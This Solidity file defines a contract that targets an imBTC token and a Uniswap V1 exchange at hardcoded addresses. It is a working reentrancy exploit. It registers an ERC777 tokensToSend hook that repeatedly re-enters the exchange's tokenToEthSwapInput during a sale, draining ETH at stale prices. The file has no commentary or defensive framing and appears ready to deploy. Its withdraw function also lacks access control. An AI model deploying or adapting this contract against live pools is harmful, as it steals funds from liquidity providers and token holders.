pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";

interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint256,
        uint256,
        uint256
    ) external returns (uint256);

    function ethToTokenSwapInput(uint256, uint256)
        external
        payable
        returns (uint256);

    function getEthToTokenInputPrice(uint256) external returns (uint256);

    function getTokenToEthInputPrice(uint256) external returns (uint256);
}

interface IMBTC {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;
}

contract Luck {
    address private imbtc = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
    address private uniswapV1 = 0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187;
    address private erc1820 = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;
    bytes32 private constant ERC1820_InterfaceHash_TokensSender =
        keccak256(abi.encodePacked("ERC777TokensSender"));
    uint256 counter = 0;
    uint256 max_times;

    constructor(uint256 _times) payable {
        max_times = _times;
        IMBTC(imbtc).approve(uniswapV1, type(uint256).max);
        IERC1820Registry(erc1820).setInterfaceImplementer(
            address(this),
            ERC1820_InterfaceHash_TokensSender,
            address(this)
        );
    }

    function good_luck() external payable {
        uint256 amount_input = IUniswapV1(uniswapV1).getEthToTokenInputPrice(
            address(this).balance
        );
        uint256 amount = IUniswapV1(uniswapV1).ethToTokenSwapInput{
            value: address(this).balance
        }((amount_input * 99) / 100, block.timestamp + 120);
        amount_input = IUniswapV1(uniswapV1).getTokenToEthInputPrice(
            amount / max_times
        );
        counter++;
        IUniswapV1(uniswapV1).tokenToEthSwapInput(
            amount / max_times,
            (amount_input * 99) / 100,
            block.timestamp + 120
        );
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (counter < max_times) {
            uint256 amount_input = IUniswapV1(uniswapV1)
                .getTokenToEthInputPrice(amount);
            counter++;
            IUniswapV1(uniswapV1).tokenToEthSwapInput(
                amount,
                (amount_input * 99) / 100,
                block.timestamp + 120
            );
        } else {
            counter = 0;
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
